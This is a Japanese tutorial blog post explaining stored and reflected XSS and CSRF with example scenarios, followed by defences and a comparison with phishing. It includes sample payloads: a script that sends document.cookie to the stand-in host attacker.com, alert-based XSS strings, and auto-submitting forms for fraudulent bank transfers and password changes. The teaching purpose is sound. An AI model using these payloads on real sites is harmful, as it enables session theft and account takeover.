---
title: 'XSSとCSRF'
author: "sakakibara"
description: 'Lorem ipsum dolor sit amet'
heroImage: '/blog-placeholder-3.jpg'
pubDate: 2024-10-18
tags: ["astro", "math"]
---

# Introduction
セキュリティの, 特に攻撃手法は名前だけ見ても聞いてもなんのことか分かりづらい.
そこで, 今回はXSSとCSRFについて具体例をベースに説明する.

## Contents
## XSS
XSSは(クロス・サイト・スクリプティング: サイト間のスクリプト埋め込み)と読む.
具体的には以下のようなストーリで進行する攻撃を指す.
XSSには

- Stored XSS
- Reflected XSS

のように種類がある.
### ストーリ: Stored XSS
> ある掲示板サイトに、コメント機能が実装されています。
> ユーザーは自由にコメントを投稿できますが、投稿された内容が適切にエスケープされずにページに表示されます。
> 攻撃者はここに悪意のあるスクリプトを投稿し、それが他のユーザーによって実行されるように仕組みます。

攻撃の流れとして

1. 攻撃者が掲示板にコメントを投稿
```javascript
<script>alert('XSS Attack!')</script>
```

2. この投稿が掲示板に保存され、他のユーザーがそのページを開いたときに、このスクリプトが自動的に実行される.

3. 実行されると、alertボックスが表示され、攻撃の存在が確認される.

4. 攻撃者がもっと高度なスクリプトを仕込んで、被害者のCookie情報(セッションIDなど)を盗むことも可能となる. 例えば：

```javascript
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
このようにすることで, この掲示板をみた人は`XSS Attack!`というアラートが表示され,
その上, 攻撃者のサーバにその掲示板のCookie情報が送信される.


### ストーリ: Reflected XSS
> ショッピングサイトやブログなどのWebサイトには、ユーザーが検索を行う機能があります。例えば、検索ボックスに「ノートパソコン」と入力すると、ページ上部に「ノートパソコンの検索結果」といった文が表示されることがあります。
> このように、ユーザーが検索したクエリがそのままページの中に表示される場合, 
> サーバーは入力内容を適切にサニタイズせずに表示するため、攻撃者が特定のURLに悪意のあるスクリプトを埋め込み、それを他のユーザーにクリックさせることでXSS攻撃を行います。

攻撃の流れとして
1. 攻撃者が、以下のような検索URLを生成する.
```bash
https://example.com/search?q=<script>alert('XSS');</script>
```

2. 攻撃者は, このURLをメールやソーシャルメディアなどで被害者に送る. 被害者は, 正規の検索サイトへのリンクだと誤解してクリックしてしまう.
3. サーバーは検索クエリ（`q`パラメータ）を受け取り、その内容をサニタイズせずに応答ページに挿入する. この場合、サーバーは`<script>`タグをそのままページに出力してしまう. (あえて`</script>`で終わらせている)
4. 被害者がそのリンクをクリックすると、ブラウザで検索結果ページが表示されるが、ページ内で埋め込まれたスクリプト`alert('XSS Attack');`が実行され、攻撃が成立する。

このように, 被害者のブラウザで任意のJavaScriptが実行され, 個人情報の流出や不正な操作が行われる.


## CSRF
CSRFは(クロス・サイト・リクエスト・フォージェリ: サイト間のリクエスト偽装)と読む.
具体的には以下のようなストーリで進行する攻撃を指す.

### ストーリ: 銀行振り込み
> ある銀行のオンラインバンキングサイトには、ログインしているユーザーが送金できるフォームがあります。
> このフォームは、Cookieを使ってユーザーの認証情報を管理していますが、CSRFトークンのような防御策がありません。
> 攻撃者はこれを利用して、ユーザーが知らないうちに不正な送金を行わせます。

攻撃の流れとして
1. 被害者がログインしている状態: 例えば, 被害者が`https://bank.com`でログインし, そのセッションIDがCookieとしてブラウザに保存されているとする. このCookieは, 被害者が`https://bank.com`にアクセスするたびにブラウザが自動的に送信する.

2. 攻撃者のページを開く: この状態で, 被害者が攻撃者の作った悪意のあるページ(`https://evil.com`)を誤って開くと, 攻撃者のページに隠されたHTMLフォームやスクリプトが被害者のブラウザで実行される. このフォームは, 被害者がログインしている`https://bank.com`に送信されるように設計されている.
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="Transfer">
</form>
<script>
  document.forms[0].submit();
</script>
```

3. ブラウザが自動的にCookieを送信: 被害者が攻撃者のページを見ただけで, 上記のフォームが送信される. 被害者のブラウザはこのリクエストを`https://bank.com`に対して送信するが, その際, 被害者がすでに`https://bank.com`にログインしているため, ログイン状態を示すセッションIDのCookieも自動的に一緒に送信される.

4. サーバーが正当なリクエストと認識: サーバーはこのリクエストに被害者のCookieが含まれているため, 正規のユーザーが送信したリクエストであると認識する. これにより, 攻撃者が意図した送金操作やアカウント変更が実行されてしまう.


この攻撃は認証されたユーザの権限を悪用して, 操作を行う.
このように, 被害者が意図しない金融取引やアカウント情報の変更を実行される可能性がある.

CSRF攻撃では, 被害者の**ログイン状態が共有される**という点が非常に重要となる.
この仕組みは, WebブラウザがCookieを自動的に送信する動作を悪用している.

#### Cookieによるセッション管理
ほとんどのWebアプリケーションでは, ログイン状態(セッション情報)はCookieを使って管理されている.
ユーザーがサイトにログインすると, ブラウザはそのサイトから発行されたセッションID(または認証トークン)をCookieとして保持する.
このCookieは、ユーザーがそのサイトにアクセスするたびに、ブラウザが自動的にリクエストと一緒にサーバーに送信する.

たとえば, ユーザーが`https://bank.com`にログインすると, そのサイトのセッションIDがCookieとして保存される. その後, ユーザーが別のページ(`https://evil.com`)に移動したり, 操作を行うたびに, ブラウザは自動的にそのセッションIDを`https://bank.com`に送信する. このため, ユーザーは再ログインせずに操作を続けられる.

攻撃者は, このCookieの自動送信という仕組みを悪用して, 不正なリクエストを送信させる. CSRF攻撃では, 被害者が攻撃者のページを開くだけで, 被害者がログインしている別のサイトに対して不正なリクエストを送信できるのだ. ここでポイントになるのは, 被害者のブラウザが, 攻撃者が意図したリクエストと一緒に被害者のCookieを自動で送信することにある.

### ストーリ: CSRFによるパスワード変更

> あるWebサービスで、ユーザーがログイン後にパスワードを変更する機能がありますが、このパスワード変更リクエストには適切なCSRF保護が実装されていません。
> 攻撃者は、被害者に不正なパスワード変更リクエストを送信させます。

攻撃の流れ
1. 攻撃者は, 被害者がログインしていることを前提に, 以下のようなフォームを攻撃用のWebページに仕込んでおく.(`https://evil.com`)
```html
<form action="https://example.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked_password">
  <input type="submit" value="Change Password">
</form>
<script>
  document.forms[0].submit();
</script>
```

2. 被害者がそのページにアクセスすると, 自動的にパスワード変更リクエストが送信される.
3. 被害者のパスワードが攻撃者によって「hacked_password」に変更されてしまう.

この攻撃により, 被害者のアカウントが乗っ取られる可能性がある.
また, 攻撃者は被害者のアカウントに完全にアクセスできるようになり, 個人情報の漏洩や不正な操作が行われる可能性がある.

## XSSとCSRFの違い
- XSSはクライアントサイトの脆弱性を悪用する攻撃であり, 主にスクリプトの挿入が問題になる.
- CSRFはサーバー側の認証を悪用し, 被害者に偽のリクエストを送信させる攻撃である.

これらに対する対策を次に示す.

## 対策
### XSS対策

- **入力の検証・サニタイズ**
ユーザーからのすべての入力(フォーム入力、URLパラメータなど)を検証し, 不要なスクリプトが含まれていないか確認する. HTMLエンコードやJavaScriptエスケープを行い、悪意のあるスクリプトを無効化する.

- **HttpOnly 付きCookie**
Cookieに`HttpOnly`属性を設定することで、JavaScriptからCookieをアクセスできなくする。

- **CSP（Content Security Policy）**
コンテンツセキュリティポリシーを使用し、許可されたスクリプトの実行を制限する. CSPを正しく設定することで、XSS攻撃のリスクを大幅に低減できる.

### CSRF対策
- **CSRFトークンの使用**
フォーム送信やAPIリクエストに対して、サーバー側で生成した一意のトークン（CSRFトークン）を要求し、リクエストの正当性を確認する。このトークンは、サーバーとクライアント間で共有され、リクエストに含まれていない場合は操作が無効化される。

- **SameSiteCookie属性**
`SameSite`属性を`Strict`または`Lax`に設定することで、外部サイトからのクロスサイトリクエストによってCookieが送信されることを防ぐ。

- **リファラーチェック**
リクエストの`Referer`ヘッダーを確認し、信頼されたドメインからのリクエストのみを許可する。

## フィッシング詐欺との違い
フィッシング詐欺は, ユーザーの個人情報（パスワード, クレジットカード番号など）を盗むために, 攻撃者が正規のWebサイトに似せた偽サイトを作成し, ユーザーをそのサイトに誘導する攻撃手法となる.
フィッシング攻撃の主な特徴は, ユーザーが信じ込んでしまうように, 正規のWebサイトに似せたサイトを使うことにある.

フィッシング詐欺の目的は
  - ユーザーの認証情報や個人情報を直接的に盗むこと。
  - 被害者に偽のフォームに入力させ、その情報を攻撃者に送る。

ことにある.

どちらも, 被害者を騙して不正なリンクをクリックさせるという点で, フィッシングと似ている.

対して, Reflected XSSは正規のWebページに悪意のあるスクリプトを挿入し, そのスクリプトを被害者のブラウザで実行させることを目的としている.

また, CSRFは, 被害者が正規のWebサイトに対して意図せずに不正なリクエストを送信することを目的としている. CSRFでは, ユーザーの情報を盗むのではなく, ユーザーの権限を悪用して不正な操作を行うのが目的となる.
